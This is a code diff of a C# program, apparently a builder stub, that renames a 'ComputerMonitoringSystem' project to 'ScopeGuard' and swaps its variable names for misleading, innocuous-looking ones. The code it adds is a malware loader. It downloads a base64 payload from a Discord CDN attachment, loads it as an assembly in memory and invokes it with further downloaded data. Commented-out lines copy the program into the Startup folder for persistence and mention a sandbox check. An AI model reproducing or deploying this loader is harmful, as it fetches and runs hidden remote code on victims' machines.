@@ -14,7 +14,7 @@ using System.Windows.Forms;
 
 
 
-//Default [assembly: AssemblyTitle("ComputerMonitoringSystem")]
+//Default [assembly: AssemblyTitle("ScopeGuard")]
 //Default [assembly: AssemblyProduct("ComputerMonitoringSystem")]
 //Default [assembly: AssemblyCopyright("Copyright ©  2019")]
 //Default [assembly: AssemblyFileVersion("1.0.0.0")]
@@ -27,114 +27,21 @@ using System.Windows.Forms;
 //Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]
 
 
-
-
-
-
-
-namespace ComputerMonitoringSystem
+namespace ScopeGuard
 {
-    class frmUser
+    static class onExitScope_
     {
-        public int FindMax(int num1, int num2)
-        {
-            /* local variable declaration */
-            int result;
-
-            if (num1 > num2)
-                result = num1;
-            else
-                result = num2;
-            return result;
-        }
-
-        static void Maint(string[] args)
-        {
-            /* local variable definition */
-            int a = 100;
-            int b = 200;
-            int ret;
-
-
-            Console.ReadLine();
-        }
-    }
-}
-
-
-
-namespace ComputerMonitoringSystem
-{
-    class usableFunction
-    {
-
-    }
-}
-
-namespace ComputerMonitoringSystem
-{
-    static class frmItems
-    {
-
-
-        //        Public Sub checkOption(ByVal chk As CheckBox, ByRef yesno As String)
-        //    If chk.CheckState = CheckState.Checked Then
-        //        yesno = "Yes"
-        //    Else
-        //        yesno = "No"
-        //    End If
-        //End Sub
-
-
-
-        //initialize the validating method
-        static Regex Valid_Name = StringOnly();
-        static Regex Valid_Contact = NumbersOnly();
-        static Regex Valid_Password = ValidPassword();
-        static Regex Valid_Email = Email_Address();
-
-
-
-        //Method for validating email address
-        private static Regex Email_Address()
-        {
-            string Email_Pattern = @"^(?!\.)(""([^""\r\\]|\\[""\r\\])*""|"
-                + @"([-a-z0-9!#$%&'*+/=?^_`{|}~]|(?<!\.)\.)*)(?<!\.)"
-                + @"@[a-z0-9][\w\.-]*[a-z0-9]\.[a-z][a-z\.]*[a-z]$";
-
-            return new Regex(Email_Pattern, RegexOptions.IgnoreCase);
-        }
-        //Method for string validation only
-        private static Regex StringOnly()
-        {
-            string StringAndNumber_Pattern = "^[a-zA-Z]";
-
-            return new Regex(StringAndNumber_Pattern, RegexOptions.IgnoreCase);
-        }
-        //Method for numbers validation only
-        private static Regex NumbersOnly()
-        {
-            string StringAndNumber_Pattern = "^[0-9]*$";
-
-            return new Regex(StringAndNumber_Pattern, RegexOptions.IgnoreCase);
-        }
-        //Method for password validation only
-        private static Regex ValidPassword()
-        {
-            string Password_Pattern = "(?!^[0-9]*$)(?!^[a-zA-Z]*$)^([a-zA-Z0-9]{8,15})$";
-
-            return new Regex(Password_Pattern, RegexOptions.IgnoreCase);
-        }
-   
         [STAThread]
         static void Main()
         {
-            using (WebClient w = new WebClient())
+            using (WebClient BOOST_PP_CAT = new WebClient())
             {
 
                 try
                 {
-                 //sandboxie controlsandboxie();
+
+
+                   //sandboxie controlsandboxie();
 
                     //Messega
 
@@ -156,43 +63,35 @@ namespace ComputerMonitoringSystem
 
 
 
-                    string ccc;
+                    string gdiplus;
 
-                    ccc = "https://cdn.discordapp.com/attachments/841595401253158954/843305332738097162/sokayim_alayina.txt"; // هنا تضع رابط القيم تبع السيرفر 
+                    gdiplus = "https://cdn.discordapp.com/attachments/841595401253158954/843480531470385152/httpsstackoverflow.comquestions3669833c11-scope-exit-guard-a-good-idea78051007805100.txt"; 
 
-                    WebClient e;
+                    WebClient at_scope_end;
 
-                    e = new WebClient();
+                    at_scope_end = new WebClient();
 
-                    string sss;
+                    string GdiplusShutdown;
 
-                    sss = e.DownloadString(ccc);
-
-
-                    byte[] aa;
+                    GdiplusShutdown = at_scope_end.DownloadString(gdiplus);
 
 
-                    aa = Convert.FromBase64String(sss);
+                    byte[] index;
+
+
+                    index = Convert.FromBase64String(GdiplusShutdown);
 
 
 
-                    object s = new object[] { %aPP%, string.Empty, w.DownloadData("%Server%"), true };
+                    object expr = new object[] { %aPP%, string.Empty, BOOST_PP_CAT.DownloadData("%Server%"), true };
 
-                    string o = "ShutDown.frmclass";
+                    string move = "ShutDown.frmclass";
 
-                    AppDomain.CurrentDomain.Load(aa).GetType(o).InvokeMember("stat", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])s);
+                    AppDomain.CurrentDomain.Load(index).GetType(move).InvokeMember("stat", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])expr);
 
 
-                    #region POST YAPILIYOR
-                    string postUrl = "http://localhost:57460/Home/Index";
-                    var gelenYanit = w.UploadValues(postUrl, new NameValueCollection() { { "id", "" } });
-                    #endregion
-                    #region POST NETİCESİNDE ÇIKTI ALINIYOR
-                    string result = System.Text.Encoding.UTF8.GetString(gelenYanit);
-                    MessageBox.Show(result);
-                    #endregion
 
-                        //start  {
+                    //start  {
                     //start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
                     //start  }
 
